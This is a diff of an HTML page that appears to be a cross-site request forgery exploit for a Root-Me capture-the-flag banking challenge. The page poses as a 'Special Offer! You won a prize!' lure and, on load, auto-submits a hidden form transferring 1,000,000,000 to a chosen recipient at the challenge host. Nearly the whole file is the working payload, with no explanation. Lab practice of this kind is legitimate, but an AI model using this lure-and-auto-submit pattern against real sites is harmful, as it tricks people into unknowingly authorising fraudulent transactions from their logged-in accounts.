@@ -1,18 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Transfer</title>
-</head>
-<body>
-    <form id="transferForm" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
-        <input type="hidden" name="recipient" value="caca">
-        <input type="hidden" name="amount" value="1000000000">
+<html>
+  <head>
+    <title>Special Offer!</title>
+  </head>
+  <body>
+    <h1>Special Offer! You won a prize!</h1>
+    <p>Click below to claim your reward:</p>
+    
+    <!-- This form will be auto-submitted when the page loads -->
+    <form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
+      <input type="hidden" name="recipient" value="caca">
+      <input type="hidden" name="amount" value="1000000000">
     </form>
 
-    <script>
-        document.getElementById('transferForm').submit();
+    <script type="text/javascript">
+      // Wait for the page to load before submitting the form
+      window.onload = function() {
+        document.getElementById("csrfForm").submit();
+      }
     </script>
-</body>
+  </body>
 </html>
